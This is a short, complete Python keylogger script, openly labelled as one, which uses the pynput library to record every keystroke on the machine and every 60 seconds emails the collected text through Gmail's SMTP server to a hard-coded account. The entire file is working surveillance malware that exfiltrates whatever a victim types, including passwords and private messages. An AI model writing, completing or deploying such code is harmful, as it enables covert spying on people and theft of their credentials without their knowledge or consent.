#!/usr/bin/env python
import smtplib
from pynput.keyboard import Listener, Controller, Key
import threading


class Logger:
    def __init__(self, time, email, password):
        self.record = "KeyLogger Started B-)"
        self.email = email
        self.password = password
        self.time = time

    def add_record(self, key):
        self.record += str(key)

    def action(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if "Key.space" == str(key):
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.add_record(current_key)

    def send_email(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        self.send_email(self.email, self.password, self.record)
        self.record = ""
        thread = threading.Timer(self.time, self.report)
        thread.start()

    def start(self):
        with Listener(on_press=self.action) as listener:
            self.report()
            listener.join()


def main():
    keyLog = Logger(60, 'youremail@gmail.com', 'yourpassword') #ip and pass
    keyLog.start()


if __name__ == "__main__":
    main()
